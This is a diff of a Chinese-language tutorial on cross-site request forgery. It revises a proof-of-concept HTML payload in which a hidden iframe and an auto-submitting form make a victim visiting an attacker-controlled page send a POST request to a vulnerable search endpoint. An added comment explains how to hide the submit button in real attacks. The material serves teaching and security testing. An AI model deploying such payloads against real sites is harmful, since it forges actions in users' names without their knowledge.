@@ -70,20 +70,20 @@ Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
   * 攻击者可控的第三方域:`www.3.com`会被victim访问
   * 目标域存在CSRF漏洞
 
-通过多种办法(如JavaScript) 在 `https://www.3.com/demo` 中注入代码:
+通过多种办法(如JavaScript或HTML注入) 在 `https://www.3.com/demo` 中注入html代码:
 
 ```
-  <script>history.pushState('', '', '/')</script>
-    <form name="frm" action="https://post.csrfvul.com/search" method="POST">
+<iframe style="display:none" name="csrf-frame1"></iframe>
+<form method='POST' action='https://post.csrfvul.com/search' target="csrf-frame1" id="csrf-form">
       <input type="hidden" name="ip" value="1&#46;1&#46;1&#46;1" />
       <input type="hidden" name="offset" value="0" />
       <input type="hidden" name="limit" value="20" />
-      <input type="submit" value="Submit request" />
+      <input type="submit" value="send Request" /><!--实战中去掉这一行 不会影响POST请求的发送 可以隐藏按钮-->
     </form>
-<script>document.frm.submit()</script>
+<script>document.getElementById("csrf-form").submit()</script>
 ```
 
-victim访问 `https://3.com/demo` 则会发出POST请求到`post.csrfvul.com`
+victim访问 `https://3.com/demo` 则会发出POST请求到`https://post.csrfvul.com`
 
 `post.csrfvul.com`收到了这个POST请求:
 ```
